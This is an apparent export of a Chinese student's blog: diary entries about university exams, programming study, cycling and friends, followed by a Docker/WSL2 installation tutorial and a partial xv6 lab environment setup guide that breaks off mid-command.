title="今日再记:"></a>今日再记:</h3><p>当天就去换买了新的网卡,ax211,花了一个小时,把笔记本小心翼翼的拆了,拆完后装上网卡,拼好开机,和之前差不多,只能说这钱差不多白花了,前天晚上突发奇想,将两台笔记本参照着网上的教程进行2了异地组网,兴许时syncthing改了我的系统文件,导致我的vscode不能识别中文文件,让我直接多花了好几个小时才发现这个愚蠢的问题,现在终于调试好了.<br>除此之外,前天晚上兴冲冲的抱着相机出去操场上拍又大又圆的月亮,拍完后伴着无可奈何,计划全被打断的心情和王尸傅去散步又和丽云回合,绕着华工走了一个小时,等到雯雯下课,我们四个一起去吃宵夜,喝酒吃烧烤,聊天吹牛打屁,听丽云讲他的小丑故事,才发现是这么坎坷,奇幻,玄幻,梦幻(只能说奶奶灰无敌),还有王尸傅是真的人生赢家,我是joker了,当然雯雯没我joker(毕竟他舔到了,我都找不到,急急急)<br>昨天晚上去北京路完了,才知道原来北京路的晚上这么好看,大佛寺是真的壮观,我们还拍了好多合照,还吃了好好吃的牛蛙,又拍了六七个gb,删完后只剩下十几张可以用的,特别是把雯雯拍的贼好看(只能说我要出师了)(为雯雯打call!!!)</p><h4 id="这是我最喜欢的大月亮"><a href="#这是我最喜欢的大月亮" class="headerlink" title="这是我最喜欢的大月亮"></a>这是我最喜欢的大月亮</h4><p><a href="https://pic.imgdb.cn/item/653e216fc458853aef7e092f.jpg"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071319375.jpg"></a><br>再放几张合照,免得到时后清没了<br><del>悲哀,搞了半天,那个免费的图床只能存5mb以下的,为什么丽云不快快搞好学生云,让我能放图,为什么丽云的相片这么大,想把他杀了</del></p><h2 id="2023-12-9-12-08-48"><a href="#2023-12-9-12-08-48" class="headerlink" title="2023-12-9 12:08:48"></a>2023-12-9 12:08:48</h2><h3 id="浅浅复盘一下这几天"><a href="#浅浅复盘一下这几天" class="headerlink" title="浅浅复盘一下这几天"></a>浅浅复盘一下这几天</h3><p>上一次记日记已经是10月29日了,已经40天左右没记日记了,但这一个月多还是发生了很多变化</p><h4 id="我换了两台电脑"><a href="#我换了两台电脑" class="headerlink" title="我换了两台电脑"></a><del>我换了两台电脑</del></h4><p>现在换成了macbook  air m1,虽然花的钱稍微多了一点点,但至少省了点事情,不得不说,macbook的体验真的很好,但就是很多专业方面的东西网上的教程比较少,走的弯路比较多,毕竟macbook的受众不广,但m1芯片的续航,散热真的深得我心 ,可以用整整一天多,而且可以长时间保持不关机,apple对macbook的调教是真的强,当然也体现在价格上,我目前是16+256,准备在之后不够用的时候直接去华强北扩容到2TB,也才花了个千把块,算是不错的选择,现在的macbook上就放了很多东西,包括但不限于blog框架,git的配置,<del><strong>这些东西是真的配置麻烦</strong></del>但配置后也整理了整理能用的资料,也算是入门的成本了.</p><h4 id="学习到的新知识"><a href="#学习到的新知识" class="headerlink" title="学习到的新知识"></a>学习到的新知识</h4><p>过了这么久,发现自己还是学到了一点点知识的,比如开始在数分,线代作业上大部分自己写了,然后还看了一部分MIT的线代网课,不得不说,国外的教授教书真的是很有方法,很会启迪学生思考,当然和教了60多年线代的老教授也有很大关系,但不得不说,MIT的线代课让我对线性代数这门课有了一点点的好感,至于窝工的教材,自我感觉是讲的没有这么的透彻,打开书本满篇的都是推导,定义,证明,希望能快快改进.至于数分,则感觉是自己之前落下了太多工课,导致后面比较吃力,但钻研久点,对着书本慢慢啃,还是有不错的效果的,至于ACM竞赛学习方面最近几乎没有推动,动态规划的进阶看了两节课就暂停了,去搞XV6和CSAPP了,<del>在师傅的带动下,乐</del></p><h4 id="开拓的眼界"><a href="#开拓的眼界" class="headerlink" title="开拓的眼界"></a>开拓的眼界</h4><p>了解了CMU的CSAPP课程,了解了GIT这个强大的工具,学习了一点点的VIM的操作知识,在师傅的帮助下配置好了XV6的环境,并整理了自己的windows和mac上关于vscode的配置,并制作成了markdown的文档形式发布到博客上<del>虽然是在重复造轮子,但我造的是现在能用的轮子</del>,才恍然间发现计算机世界真正浩瀚的地方所在,这是一个宏大的赛博世界,有幸能继续在这方面学习,研究,深入探讨.</p><h4 id="人际关系"><a href="#人际关系" class="headerlink" title="人际关系"></a>人际关系</h4><p>丽云谈了女朋友,现在群里面只有我和雯雯是单身的,还要时不时被发狗粮,但人际关系自我感觉处的是不错,<del>毕竟都没新认识什么人</del>,这一两个月做的都是在深耕和熟人的交互,但新认识了刘汝然,算是挺有意思的一个女生,<del>重点是还被丽云吐槽情商低了点,虽然确实这样,反思反思</del>,这样就挺不错的,挺好的</p><h3 id="对未来几天的展望-计划"><a href="#对未来几天的展望-计划" class="headerlink" title="对未来几天的展望&amp;&amp;计划"></a>对未来几天的展望&amp;&amp;计划</h3><p>怎么说捏,这是期末周了快,要准备一系列的考试,计概还没学,C++还有类没有学,数分和线代没学好,工图还没有画,还要考英语四级,考完试还有军训<del>昨天就梦到在军训,被训死了</del>,我不能顾此失彼,要让手走的比脑子快,这几天把吉他快捡回来了,每天一个小时,从三号开始,还没中断过,开始练左右手指法,感觉慢慢来打好基本功,再练歌也不迟,少刷点视频,少看点手机,多看看不懂的东西,<del><strong>想不到到了大学还要应试</strong></del>,加油加油,希望大家都能考高分,都不会挂科!!!</p><h2 id="2023-12-11-16-23-00"><a href="#2023-12-11-16-23-00" class="headerlink" title="2023-12-11 16:23:00"></a>2023-12-11 16:23:00</h2><h3 id="这个周末干了啥"><a href="#这个周末干了啥" class="headerlink" title="这个周末干了啥"></a>这个周末干了啥</h3><p>这个周末把csapp的第一个lab囫囵吞枣过了一遍,干到了凌晨四点钟,有一说一,在这一次lab我确切的惊叹于位运算的神奇,也得以一窥计算机世界的奇妙,惊叹这些前辈的脑回路和绝妙构思<del>光是一个float都困扰了我3个小时,虽然到现在也比较迷糊就是了</del>得找个时间认真的学习一下. </p><p>快要考四级了,这周六就要考四级了,最近是接近没课的状态,每天一套四级卷子,今天开始.</p><p>昨天练琴,一个左手的指法整整练了一个小时都没有熟练,到底是我手指不灵活还是我的脑瓜子不灵活呢,亦或是两者皆有之,值得思考,但这么多天都坚持练琴着实是一个难能可贵的坚持,加油加油,练到寒假就开始练歌,现在打好基本功,到时后练歌嘎嘎快</p><h3 id="下个周要干啥"><a href="#下个周要干啥" class="headerlink" title="下个周要干啥"></a>下个周要干啥</h3><p>**四级四级四级!!!**一定要过,一定不要裸考,有一定的准备好不,还有科目复习,csapp和xv6就先放一边去,寒假的时候再钻研,ACM也是.争取绩点拿高一点点,第一目标不挂科,第二目标奖学金,现在体考今年有75了,控制下体重不要涨了,还有好几天没啦引体了,再不拉茧子就要掉了</p><p>还有丽云要请吃海底捞,捞捞捞!</p><h2 id="2023-12-12-15-22-00"><a href="#2023-12-12-15-22-00" class="headerlink" title="2023-12-12 15:22:00"></a>2023-12-12 15:22:00</h2><h3 id="何为人-人为何"><a href="#何为人-人为何" class="headerlink" title="何为人,人为何"></a>何为人,人为何</h3><p>纵有万千事,我任自娱自乐,总是在发呆中探寻学科之外,在繁忙中找自己的兴趣,这究竟是一种独特的好奇还是自我的放弃,对现实的逃避.每每总会惊叹于雯雯的隽永文笔,不时的感慨于其笔尖抒发的感情,又惊叹于互联网上真有以博客抒情的神人,将技术与文化融为一体,每每阅览其文章自觉地心旷舒畅.反关于自身,可以在wechat,qq中不断切换,期许这能盼许些消息,但未曾知一条条的消息带来的就仿佛像是同人讲话时满口的毫无营养和闲扯瞎聊,纵使这些在文人墨客的口中总是描写的诗情画意,但我去不以为然,昨日看该人之博客方思考人该怎样活</p><blockquote><p><a href="https://wdxtub.com/">小土刀 2.0 (wdxtub.com)</a></p></blockquote><h3 id="何为不周山"><a href="#何为不周山" class="headerlink" title="何为不周山"></a>何为不周山</h3><blockquote><p>西北海之外，大荒之隅，有山而不合，名曰不周。</p></blockquote><p>人知而无涯,越知方越知自己的无知</p><h3 id="何为通天塔"><a href="#何为通天塔" class="headerlink" title="何为通天塔"></a>何为通天塔</h3><p>通天塔也叫巴别塔，是巴别城的人们为了传播自己名声想要建造的一座高耸入云的塔。</p><blockquote><p>他们说，“来吧，我们要建造一座城和一座塔，塔顶通天，为了扬我们的名，免得我们被分散到世界各地。”</p></blockquote><p>塔通天,这未尝不体现一种精益求精的精神,自然也体现了巴别城的人的欲望和期望,但在开源的互联网环境,自然是希望有许多高塔,以高塔团结起志同道合的朋友.</p><h3 id="何为彼岸花"><a href="#何为彼岸花" class="headerlink" title="何为彼岸花"></a>何为彼岸花</h3><p>越过层层大涛小浪,心中有好望角的彼岸,无论何时何地都有方向,心中自有美好.</p><blockquote><p>彼岸花，非世俗之花，乃灵动之物，夜色中之幻影。</p><p>其英华如火，赤若炎霞，瑰姿绝世。华之间，若幻若梦，芳馨漫溢，仿佛仙境之景。其根枝如龙蛇纷披，苍劲有力，似能穿云翻雨；而华则似火龙舞动，摇曳生姿，飘飘欲仙。</p></blockquote><p>彼岸自有花开,彼岸自是远方</p><h2 id="2023-12-15-21-01-00"><a href="#2023-12-15-21-01-00" class="headerlink" title="2023-12-15 21:01:00"></a>2023-12-15 21:01:00</h2><p>明天早上八点20就要进考场,考四级,但好像目前为止只做了一套题不到总共,确实是个问题,今天早上搞了搞TED,开始困窘于怎么下载听力文稿,然后便有感而发,做了一篇文章关于信息检索的大话,其实也就这样,四级怎么复习都没什么区别(<del>应该吧</del>),现在就去和广大网友一起看看四级怎么抓吧,复习啥的就过去了,但是呀,每天都要听听力,去比对下VOA和TED每天要有一个小时的听力摄入,同时每天要弹一个小时的琴,今天倒在大横按上了,无语死,只能说练得少活该,虽然我倡导人要向前看,但是呀,向后看一小会是为了更好的与自己和解,自己总会发挥的低于期望,这也是一种宿命吧.</p><h2 id="2023-12-15-21-01-00-1"><a href="#2023-12-15-21-01-00-1" class="headerlink" title="2023-12-15 21:01:00"></a>2023-12-15 21:01:00</h2><p>四级考完了，着实是一种挑战，在自我怀疑和听力难度的加持下，听力是真的听不懂，阅读也做的痛苦，毕竟太久没做了，昨天做的计划要按时执行每天掏出两个小时就够了。<br>给李心晴买的礼物到了，还挺不错，特别是横幅”娘娘长命百岁，师傅相伴一生”,给嫂子一个惊喜<br>下周的计概期末考试，准备复习了</p><h2 id="2023-12-22-21-49-00"><a href="#2023-12-22-21-49-00" class="headerlink" title="2023-12-22 21:49:00"></a>2023-12-22 21:49:00</h2><h3 id="摆烂"><a href="#摆烂" class="headerlink" title="摆烂"></a>摆烂</h3><p>今天考完了英语，那六十道选择题是真的难，但不会做并没有什么负担，因为昨天根本没有背，昨天没有背，和佩伦大帅哥裸聊，聊了两个小时，先是愧疚于工图考试没有好好复习，没有学习纬圆法，不会画第一题，连后面题也都不怎么会，感觉要在挂科边缘了，但想了想各种东西就糊弄过去了，还剩下三个科目不能摆了，得好好学，把卷子都做一遍，打有准备的仗。</p><h3 id="亲情"><a href="#亲情" class="headerlink" title="亲情"></a>亲情</h3><p>回了家，虽然路程比较艰辛，但家是温暖的，温馨的，充满烟火气息的，特别是当我和老爸说打不到车，骑单车回来的时候，我爸马上就骑电机来接我，虽然我还是骑了半个小时的单车，哼只哼只的骑到了接近杨屋的地方，差点少了20块钱的调度费用，但还是很有意思的一个晚上。好好享受吧！孩子。</p><h2 id="2023-12-25-18-38-00"><a href="#2023-12-25-18-38-00" class="headerlink" title="2023-12-25 18:38:00"></a>2023-12-25 18:38:00</h2><h3 id="Merry-Christmas"><a href="#Merry-Christmas" class="headerlink" title="Merry Christmas"></a><strong>Merry Christmas</strong></h3><p><strong>为什么用Merry Christmas？</strong></p><p>18世纪狄更斯的小说 **A Christmas Carol《圣诞颂歌》**非常火爆,里面多次使用 <strong>Merry Christmas</strong>后来被商家发现商机疯狂炒作</p><p>从此<strong>Merry Christmas</strong>便流行起来被人们广泛使用了将近200年。</p><p>虽然happy和merry都是快乐的意思，但两者的含义有所差别**“happy”表示一种情绪，而“merry”是一种行为**</p><p>比如英语中有一种说法：<em>Eat drink and be merry. 尽情吃、喝、玩乐吧。</em></p><p>但在英国礼貌用语中“merry”有微醺的意思，Happy Christmas的意思及用法也没有错，特别是英国女王伊丽莎白二世</p><p>在每年的圣诞致辞中都会使用Happy Christmas</p><p>因为在英国的礼貌用语中:<strong>merry&#x3D;&gt;微醉的</strong></p><p>王室认为说Merry Christmas会有失女王的身份所以他们一直用的是Happy Christmas,而我们平常所说的则是：Merry Christmas</p><h2 id="2024-01-04-20-45-00"><a href="#2024-01-04-20-45-00" class="headerlink" title="2024-01-04 20:45:00"></a>2024-01-04 20:45:00</h2><h3 id="新的一年来了"><a href="#新的一年来了" class="headerlink" title="新的一年来了"></a>新的一年来了</h3><p>新的一年，又是一年过去，一年复一年，好似一事无成，但又确实充满遗憾，充满一坨遗憾，好多次决定，好多次背叛，好多次在迷茫中坚定的违背自己内心之前做的决定。一次又一次的懊悔，在之后又开始摆烂，或者说口口声声说这不能摆烂，但还是一次又一次的在刷视频中度过，在刷完视频后开始迷茫，开始无所适从，又开始一次又一次的循环</p><h2 id="2024-01-12-11-12-00"><a href="#2024-01-12-11-12-00" class="headerlink" title="2024-01-12 11:12:00"></a>2024-01-12 11:12:00</h2><h3 id="军训结束"><a href="#军训结束" class="headerlink" title="军训结束"></a>军训结束</h3><p>军训结束<del>人生最后一次</del>，寒假正式开始，虽然还有集训，但那个也不算什么，准备好了一切的学习资料，剩下的就是把他全部吸收，领悟，然后研究探索，不得不说，这一届的教官强度确实小，我们和教官的相处是真他妈的融洽，就像一个新的兄弟，但人各自有各自的归途，他们要去部队训练，我们要在大学，在社会训练，各有各的发光发热，但愿大家都能顺意，顺心。</p><h3 id="集训开始"><a href="#集训开始" class="headerlink" title="集训开始"></a>集训开始</h3><p>要开始高强度打题的生活了，先玩个一天两天，然后便要紧追师傅和丽云的脚步，虽然丽云已经好久没打题了，但是瘦死的骆驼比马大，还是很有实力的爷，师傅则是新秀，也贼有实力。</p><h3 id="学新知"><a href="#学新知" class="headerlink" title="学新知"></a>学新知</h3><p>还要学习好多，包括且不限于下学期知识，数字结构，概率论，数学分析，等等，任务艰巨。</p><blockquote><p>路漫漫其修远兮，吾将上下而求索。</p></blockquote><h2 id="2024-01-16-22-15-00"><a href="#2024-01-16-22-15-00" class="headerlink" title="2024-01-16 22:15:00"></a>2024-01-16 22:15:00</h2><h3 id="集训强度局"><a href="#集训强度局" class="headerlink" title="集训强度局"></a>集训强度局</h3><p>集训的强度真的拉满了,这几天每天做题时长七八个小时,复习了一些数据结构,动态规划,大脑要过载了,同时还要整理板子,在整理acwing notes,明天还要打一场模拟赛,好好发挥吧只能说,多做点题,多研究研究算法,多自己想想代码,以此来增强码力.</p><h3 id="宿舍寂寞局"><a href="#宿舍寂寞局" class="headerlink" title="宿舍寂寞局"></a>宿舍寂寞局</h3><p>感觉这几天在宿舍就是打题打题,打不出来然后胡思乱想,胡思乱想然后对着代码一比一对照,做<strong>盯帧</strong>,还是要自己多多想,在洛谷上多刷点题目,把题目都打过去,搞了个锅,准备明天炒菜吃,做点小菜,要搞点调味料,买点小菜,在宿舍开个小厨房</p><h3 id="正版意识"><a href="#正版意识" class="headerlink" title="正版意识"></a>正版意识</h3><p>发现自己真的很适合Typora,仔细地思考了一下,选择了一下支持正版软件<strong>89CNY</strong>,毕竟能付的起就付吧,为产品力所能及的付费,好生使用.</p><h2 id="2024-02-05-12-13-00"><a href="#2024-02-05-12-13-00" class="headerlink" title="2024-02-05 12:13:00"></a>2024-02-05 12:13:00</h2><h3 id="高强度疯玩"><a href="#高强度疯玩" class="headerlink" title="高强度疯玩"></a>高强度疯玩</h3><p>在集训过后高强度疯玩只能说,每天凌晨一两点睡<del>几乎每次都会超过两点</del>,然后早上直接摆烂,十一点左右再起床,睡到太阳晒屁股,题目也不打了,每天乐呵着打游戏刷视频,看小说,其实是有一点<code>挺多</code>焦虑的,md,毕竟丽云小子还在高强度打美赛,太卷了只能说,自己又菜又爱玩,趁着这个寒假把acwing再补一补只能是这样</p><h2 id="2024-04-28-20-27-00"><a href="#2024-04-28-20-27-00" class="headerlink" title="2024-04-28 20:27:00"></a>2024-04-28 20:27:00</h2><p>数月未记，再记已然是梦中人，感觉下学期开学不久，很多东西都发生了翻天覆地的改变，先说说这学期买了点啥，干了点啥吧</p><p>入坑了骑行，买了速比特无敌，买了码表，买了骑行服，买了骑行裤，买了车灯，买了头盔，骑了150km，现在两条大腿酸痛，休息中。</p><p>买了佳明的255号运动手表，满足李以前的这么一点点幻想。</p><p>打了校赛，但遗憾只拿了12名，虽然和三等奖的六个队伍一样，都打了五道题，但我们是最慢的，可惜了，归根结底还是自己太菜了，只能说，打的题目少，平时也不怎么训练，最后落得这个下场是很正常的，但还好拿到了省赛邀请赛的名额，以最后一位的身份批准进入省赛，ACM之路任重而道远。该训练训练，该打题打题，该看书看书，书看少了，现在一看点书就脑袋疼，这是不好的，网文软件现在都删了，往静读天下里面丢了好多名著，不得不再次感慨<a href="https://zh.z-library.se/">Z_library</a>这个神奇的网站,有着无穷无尽的免费书籍，将开源，互相奉献的精神贯彻到底了，有水平！</p><p>浅浅记到此，最近还在努力开始看CSAPP，准备快速完成CSAPP的学习，继而投入到CS61B的学习之中，毕竟他的评分系统今年过完就用不了，赶上时代的末班车！！！一想到这个真的是动力满满，充满期待！</p><p>数分，概率论真的是越来越学不动了，从开始的全凭自己到部分看答案，到大多数看了答案才有思路，属实是一种脑子退化的过程，这显然是不好的，超级不好，每当遇到不懂的时候我就会和自己说先抄完之后再学，但之后都是草草学习不了了之，你要知道，这个学期你的绩点要是不够的话，就真的是只能去搞项目了，然后在本科就进入大厂，<del>虽然我也想这样</del>，但归根结底只有一个原则，让所有的时间都在合理的利用中度过，换取一个心中的无愧了，学习，学习，还是他妈的学习！</p>]]></content>
      
      
      <categories>
          
          <category> PASTFUTURE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> 镜花水月 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker安装和踩坑</title>
      <link href="/2023/12/06/docker_use/"/>
      <url>/2023/12/06/docker_use/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直在折腾Mit6.s081的课程实验环境配置和csapp，在网上搜集了大量资料，整理出了以下教程，不得不说Docker真的是个超级无敌伟大的发明</p><blockquote><p>M系列芯片的macbook还是别考虑做实验了,反正我没折腾好。2024.5.26:折腾好了xv6的实验环境。</p></blockquote><p>众所周知，Win11&#x2F;10下有个子linux系统叫wsl，他比虚拟机更加方便快捷。docker在windows上是使用wsl中的kernel内核，所以一定要有wsl的存在。</p><h1 id="WSL2安装"><a href="#WSL2安装" class="headerlink" title="WSL2安装"></a>WSL2安装</h1><blockquote><p>在WIN10&#x2F;11下的wsl2踩坑和安装<a href="https://juejin.cn/post/7099108145825316894#heading-0">参考文章</a></p></blockquote><h2 id="安装WSL2"><a href="#安装WSL2" class="headerlink" title="安装WSL2"></a>安装WSL2</h2><p>打开终端，输入</p><pre class="line-numbers language-none"><code class="language-none">wsl -l -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若出现以下情况：</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202406191423190.png" alt="image-20240619133933862"></p><p>则输入命令安装wsl</p><pre class="line-numbers language-none"><code class="language-none">wsl --install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>wsl install</code> 报错</p><pre class="line-numbers language-none"><code class="language-none">WslRegisterDistribution failed with error: 0x80370102<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出现这个问题是因为VMware16、Hyper-v、WSL2、Docker之间出现了兼容性的问题导致报错</p><p>官方解决方法：</p><h2 id="win11解决办法"><a href="#win11解决办法" class="headerlink" title="win11解决办法"></a>win11解决办法</h2><p>具体也就是以下步骤,检查配置</p><ol><li>检查系统版本</li></ol><p>对于 x64 系统：版本 1903 或更高版本，采用 内部版本 18362 或更高版本<br>对于 ARM64 系统：版本 2004 或更高版本，采用 内部版本 19041 或更高版本<br>低于 18362 的版本不支持 WSL 2。 使用 Windows Update 助手更新 Windows 版本</p><ol start="2"><li>检查是否开启VT虚拟化</li></ol><p>在任务管理器-&gt;性能中查看</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202406191423217.png" alt="image-20240619135711599"></p><p>如果没有启用需要更改BIOS设置,具体设置方法可以百度。</p><ol start="3"><li>检查相关Windows功能是否开启</li></ol><p>win+Q键搜索-&gt;启用或关闭windows功能</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202406191423245.png" alt="image-20240619135748168"></p><p>win11需要检查是用与Linux的Windows子系统选项是否开启</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202406191423268.png" alt="image-20240619135840558"></p><h2 id="win10解决办法"><a href="#win10解决办法" class="headerlink" title="win10解决办法"></a>win10解决办法</h2><p><strong>1.安装&#x2F;打开Hyper-V</strong></p><p>这是 Docker Desktop for Windows 所使用的虚拟机。 但是这个虚拟机一旦启用，QEMU、VirtualBox 或 VMWare Workstation 15 及以下版本将无法使用！（所以更新到VMWare Workstation 16就万事大吉了）</p><p>首先右键开始菜单，选择应用与功能<br> <img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315138.awebp" alt="1513668234-4363-20171206211136409-1609350099.png"></p><p>然后点击程序与功能<br> <img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315168.awebp" alt="1513668234-4368-20171206211345066-1430601107.png"></p><p>选择启用或关闭Windows功能<br> <img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315176.awebp" alt="1513668234-9748-20171206211435534-1499766232.png"></p><p>这是第一种情况<br> <img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315190.awebp" alt="1513668234-6433-20171206211858191-1177002365.png"></p><p>如果你的界面是这样的，且没有下列选项中的Hyper-V，则先选中打钩的下面三个，然后确定，再参考<a href="https://link.juejin.cn/?target=https://blog.csdn.net/lanxingxing666666/article/details/111354089">win10没有Hyper-v的解决方法</a></p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315198.awebp" alt="Snipaste_2022-05-18_00-26-50.png"></p><p>在管理员权限下打开powershell，执行以下命令后重启电脑</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++"># 启用适用于 Linux 的 Windows 子系统dism.exe &#x2F;online &#x2F;enable-feature &#x2F;featurename:Microsoft-Windows-Subsystem-Linux &#x2F;all &#x2F;norestart# 启用虚拟机功能dism.exe &#x2F;online &#x2F;enable-feature &#x2F;featurename:VirtualMachinePlatform &#x2F;all &#x2F;norestart# 下载 Linux 内核更新包https:&#x2F;&#x2F;wslstorestorage.blob.core.windows.net&#x2F;wslblob&#x2F;wsl_update_x64.msi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-将WSL版本升级为WSL2"><a href="#2-将WSL版本升级为WSL2" class="headerlink" title="2.将WSL版本升级为WSL2"></a>2.将WSL版本升级为WSL2</h2><p>首先看看版本号是否为2</p><pre class="line-numbers language-none"><code class="language-none">wsl -l -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="没有发行版"><a href="#没有发行版" class="headerlink" title="没有发行版"></a>没有发行版</h3><p>输入以下命令：</p><pre class="line-numbers language-none"><code class="language-none">wsl --install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="已有发行版"><a href="#已有发行版" class="headerlink" title="已有发行版"></a>已有发行版</h3><p>若版本为1，使用命令 </p><pre class="line-numbers language-arduino" data-language="arduino"><code class="language-arduino">wsl <span class="token operator">--</span>set<span class="token operator">-</span><span class="token keyword">default</span><span class="token operator">-</span>version <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现版本还没改过来</p><p>管理员权限打开终端，输入命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后下载Linux的内核更新包并安装 x64：<a href="https://link.juejin.cn/?target=https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">wslstorestorage.blob.core.windows.net&#x2F;wslblob&#x2F;wsl…</a></p><p>仍然是管理员权限下打开终端，先查看更新前的WSL版本：</p><pre class="line-numbers language-none"><code class="language-none">wsl -l -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入更新的命令：</p><pre class="line-numbers language-arduino" data-language="arduino"><code class="language-arduino">wsl<span class="token punctuation">.</span>exe <span class="token operator">--</span>set<span class="token operator">-</span>version Ubuntu <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新命令有的用的：<code>wsl --set-version Ubuntu 2</code>，但是在我的电脑上报错：不存在具有提供的名称的分布。 解决方法就是把wsl改成wsl.exe.</p><h3 id="版本号为2"><a href="#版本号为2" class="headerlink" title="版本号为2"></a>版本号为2</h3><p>这步完成，开始安装docker</p><h1 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h1><blockquote><p>建议直接官网下载</p></blockquote><p><a href="https://docs.docker.com/desktop/install/windows-install/">DOCKER FOR WINDOWS</a></p><p><a href="https://docs.docker.com/desktop/install/mac-install/">DOCKER FOR LINUX</a></p><p><a href="https://docs.docker.com/desktop/install/mac-install/">DOCKER FOR MAC</a></p><p><strong>对于mac用户而言，直接去官网上下载docker，注意intel和apple版本</strong></p><p>一通安装，等它转完圈圈，就算是成功安装，可以开始环境配置了！</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202404232129489.png" alt="image-20240423211431827"></p><p>进入到这个界面就算是成功了。</p><p>下面是docker安装成功后cmd的界面：</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202404232128758.png" alt="image-20240423211517826"></p><h1 id="Docker基本命令"><a href="#Docker基本命令" class="headerlink" title="Docker基本命令"></a>Docker基本命令</h1><ol><li>拉取镜像</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull ubuntu:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>查看镜像</li></ol><pre class="line-numbers language-none"><code class="language-none">docker images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>根据镜像生成container</li></ol><pre class="line-numbers language-none"><code class="language-none">docker run -itd --name Mit_6.s081 ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>开始，附加，停止容器</li></ol><pre class="line-numbers language-none"><code class="language-none">docker start Mit_6.s081docker attach Mit_6.s081docker stop Mit_6.s081<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="5"><li>查看容器信息</li></ol><pre class="line-numbers language-none"><code class="language-none">docker ps -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>退出container命令</li></ol><pre class="line-numbers language-none"><code class="language-none">ctrl+p   ctrl+q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> EATPOOP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu配置xv6环境</title>
      <link href="/2023/12/06/environment/"/>
      <url>/2023/12/06/environment/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker安装XV6环境"><a href="#Docker安装XV6环境" class="headerlink" title="Docker安装XV6环境"></a>Docker安装XV6环境</h1><h2 id="Windows-Ubuntu"><a href="#Windows-Ubuntu" class="headerlink" title="Windows&#x2F;Ubuntu"></a>Windows&#x2F;Ubuntu</h2><ol><li>打开Docker，打开CMD（windows）或者终端（mac），刷入以下命令拉取镜像。这个 images （400多MB）开箱即用,环境已经配置好了。</li></ol><pre class="line-numbers language-none"><code class="language-none">#下载镜像docker pull linxi177229&#x2F;mit6.s081:latest# 查看docker images# 启动容器（里面有配置好的环境 和 PDF 资料）docker run --name xv6 -itd linxi177229&#x2F;mit6.s081:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>打开VScode，在扩展市场安装Docker插件，然后进入，右键对应容器，选择<strong>附加VisualStudioCode</strong>，然后vscode会自动挂载容器，会弹出一个新的窗口。</li><li>开始愉快的实验吧！</li><li>测试环境</li></ol><pre class="line-numbers language-none"><code class="language-none">cd xv6-labs-2020# 开启一个 shell 手动运行那些 usr&#x2F; 下的程序来测试make qemu  #看目录下的各级目录 ls # 自动化测试：make grade 可以获得得分情况make grade# 或者可以使用 进行单个测试.&#x2F;grade-具体lab名字 part名字<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>退出方式</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 在另一个新开的终端执行 </span><span class="token function">pkill</span> <span class="token parameter variable">-f</span> qemu  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="6"><li>调试方法 GDB</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 第一个 terminal</span><span class="token builtin class-name">cd</span> xv6-labs-2020<span class="token comment"># 第一次执行 gdb 需要 执行 